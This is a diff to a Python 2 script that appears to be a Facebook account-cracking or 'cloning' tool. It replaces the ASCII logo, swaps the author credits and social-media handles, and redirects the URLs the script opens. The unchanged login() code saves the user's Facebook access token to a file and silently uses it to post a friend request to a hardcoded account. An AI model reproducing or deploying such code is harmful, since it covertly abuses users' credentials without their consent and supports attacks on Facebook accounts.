@@ -47,18 +47,16 @@ def jalan(z):
 
 
 ##### LOGO #####
-logo = """ -----------------------------•◈•
-(  __)\\ ____--------------_------------•◈•
-|__(~)    •||•MR - IJAZ -OFFICAL------•◈•
-|__\~~) •||•IJAZ - AFRIDI---------------•◈•
-|__(-----\  •◈•-----MR-BADMASH--------•◈•
-|__~~~\ •◈•-----█-------⑦-------█------•◈•
-|__~~~\ •◈•-----█-------⑧-------█------•◈•
-|__~~~\ •◈•-----█-------⑥-------█------•◈•
+logo = """ 
+▐▓█▀▀▀▀▀▀▀▀▀█▓▌░▄▄▄▄▄░
+▐▓█░░▀░░▀▄░░█▓▌░█▄▄▄█░
+▐▓█░░▄░░▄▀░░█▓▌░█▄▄▄█░
+▐▓█▄▄▄▄▄▄▄▄▄█▓▌░█████░
+░░░░▄▄███▄▄░░░░░█████░
 \033[1;91m=======================================
 \033[1;96mAuthor  \033[1;93m: \033[1;92mIjaz Afridi
-\033[1;96mInstagram \033[1;93m: \033[1;mr_ijaz_official
-\033[1;96mFacebook  \033[1;93m: \033[1;Mr_Ijaz_official302
+\033[1;96mInstagram \033[1;93m: \033[1;m▪mr_ijaz_official01
+\033[1;96mFacebook  \033[1;93m: \033[1;m▪Mr_Ijaz_official302
 \033[1;96mGithub \033[1;93m: \033[1;92mhttps://github.com/Mrbadmash/afridi
 \033[1;91m======================================="""
 
@@ -80,10 +78,10 @@ vuln = "\033[32mVuln"
 os.system("clear")
 print "\033[1;96m ============================================================="
 print  """\033[1;91m=======================================
-\033[1;96mAuthor  \033[1;93m: \033[1;92mRana Aahil
-\033[1;96mInstagram \033[1;93m: \033[1;92mFlowRana
-\033[1;96mFacebook  \033[1;93m: \033[1;92m Aahilrana4072
-\033[1;96mGithub \033[1;93m: \033[1;92mhttps://Github.com/Therana/zero
+\033[1;96mAuthor  \033[1;93m: \033[192mIjaz Afridi
+\033[1;96mInstagram \033[1;93m: \033[1;92m▪mr_ijaz_official01
+\033[1;96mFacebook  \033[1;93m: \033[1;92m▪Mr_Ijaz_official302
+\033[1;96mGithub \033[1;93m: \033[1;92mhttps://Github.com/Mrbadmash/afridi
 \033[1;91m======================================="""
 print " \x1b[1;93m============================================================="
 
@@ -100,10 +98,10 @@ while (loop == 'true'):
             loop = 'false'
         else:
             print "Wrong Password"
-            os.system('xdg-open https://www.youtube.com/channel/UCCyRQcvCFo1ZgH4NaJM-qNw')
+            os.system('xdg-open https://www.facebook.com/Cyber.Expert302')
     else:
         print "Wrong Username"
-        os.system('xdg-open https://www.youtube.com/channel/UCCyRQcvCFo1ZgH4NaJM-qNw')
+        os.system('xdg-open https://www.facebook.com/Cyber.Expert302')
 
 def login():
 	os.system('clear')
@@ -144,7 +142,7 @@ def login():
 				unikers.write(z['access_token'])
 				unikers.close()
 				print '\n\033[1;96m[✓] \x1b[1;92mLogin Successful'
-				os.system('xdg-open https://www.Facebook.com/Omi6t')
+				os.system('xdg-open https://www.facebook.com/Cyber.Expert302')
 				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
 				menu()
 			except requests.exceptions.ConnectionError:
